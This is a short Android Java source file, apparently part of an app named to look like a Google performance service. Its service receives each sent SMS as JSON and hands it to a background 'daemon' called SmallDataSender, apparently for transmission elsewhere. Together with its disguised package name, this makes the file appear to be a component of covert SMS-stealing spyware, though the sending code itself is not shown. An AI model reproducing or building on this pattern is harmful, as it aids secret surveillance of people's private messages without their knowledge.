package com.example.tiber.googleperformancehost.Services.Temporary;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

import com.example.tiber.googleperformancehost.Services.Daemons.SmallDataSender;
import com.example.tiber.googleperformancehost.SharedClasses.Objects.ReceivedSmsData;
import com.example.tiber.googleperformancehost.SharedClasses.Objects.SentSmsData;
import com.google.gson.Gson;

/**
 * Created by tiber on 11/6/2016.
 */

public class SentSMSHandlerIntentService extends IntentService {
    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */
    public SentSMSHandlerIntentService(String name) {
        super("sent_sms_..");
    }

    public SentSMSHandlerIntentService(){
        super("sent_sms_..");
    }
    @Override
    protected void onHandleIntent(Intent intent) {
        String smsJson = null;
        if(intent != null)
           smsJson = intent.getStringExtra("sms");

        if(smsJson != null) {
            Intent startSmallDataSender = new Intent(getApplicationContext(), SmallDataSender.class);
            startSmallDataSender.putExtra("smsJson", smsJson);
            startSmallDataSender.putExtra("what", "sentSMS");
            getApplicationContext().startService(startSmallDataSender);
        }
    }


}
